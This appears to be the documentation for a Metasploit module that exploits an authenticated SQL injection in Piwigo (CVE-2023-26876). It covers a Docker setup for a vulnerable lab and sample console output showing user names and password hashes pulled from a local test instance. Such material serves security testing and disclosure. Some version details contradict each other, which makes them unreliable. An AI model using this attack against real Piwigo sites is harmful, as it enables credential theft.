## Description

  This module exploits a authenticated SQL injection vulnerability in Piwigo's photo galery for versions below 13.5.0. By using a UNION query on the `filter_user_id` parameter, this module can steal the usernames and password hashes of all users of Piwigo.

## Vulnerable Application

   Install docker [https://docker.io](docker.io) and follow the steps bellow:

   1 - Dockerfile with vulnerable version
   
   ```dockerfile

    FROM alpine:3.10.3
    LABEL maintainer="Moritz Heiber <hello@heiber.im>"

    ENV PIWIGO_VERSION="13.5.0"
    RUN set -x && apk --no-cache add curl php7 php7-gd php7-mysqli php7-json php7-session php7-exif && \
      curl "http://piwigo.org/download/dlcounter.php?code=${PIWIGO_VERSION}" --output piwigo.zip && \
      adduser -h /piwigo -DS piwigo && unzip piwigo.zip -d /piwigo && \
      install -d -o piwigo /piwigo/piwigo/galleries /piwigo/piwigo/upload && \
      chown -R piwigo /piwigo/piwigo/local && \
      apk --no-cache del curl && rm piwigo.zip

    WORKDIR /piwigo
    USER piwigo

    CMD ["php","-S","0.0.0.0:8000","-t","piwigo"]
   
   ```
   2 - install `docker-compose` and create the following file:

   ```yaml 
           version: '3'
        services:
          piwigo:
            container_name: piwigo
            image: piwigo-docker
            networks:
              - piwigo
            ports:
              - "8000:8000"
          mysql:
            container_name: piwigo_mysql
            image: arm64v8/mysql (change to you arch !!)
            command: ["--default-authentication-plugin=mysql_native_password"]
            networks:
              - piwigo
            environment:
              MYSQL_USER: "piwigo"
              MYSQL_PASSWORD: "piwigo"
              MYSQL_DATABASE: "piwigo"
              MYSQL_RANDOM_ROOT_PASSWORD: "true"

        networks:
          piwigo:
   ```
   3 - Execute the following commands

   ```bash
   $ docker build -t piwigo-docker ./
   $ docker-compose up -d
   # then Piwigo's installation page should be available at http://localhost:8000.
   # The default value for the database URL is mysql, the user is piwigo and the password is piwigo again. The initial database being created is called piwigo.
   ```

## Scenarios

### Tested on Ubuntu 22.04.2 Running Pimcore v13.5.0

```
msf6 auxiliary(gather/piwigo_cve_2023_26876) > reload
[*] Reloading module...
msf6 auxiliary(gather/piwigo_cve_2023_26876) > run
[*] Running module against 127.0.0.1

[*] try to log in..
[+] successfully logged into Piwigo!!
[+] target is vulnerable
[+] get your l00t $

Piwigo Users
============

 username  hash
 --------  ----
 admin     $P$GAO2fLIGJtRyQCNf96KbQ9PeiDAuii/
 guest
 piwigo    $P$GNrJljahQW2NXTXhWNZdalgGiao/T1/
 user      $P$GE/wX1wqKM0WKkAGXvhYihdPhgl5Mw/

[*] Auxiliary module execution completed
msf6 auxiliary(gather/piwigo_cve_2023_26876) > 

```
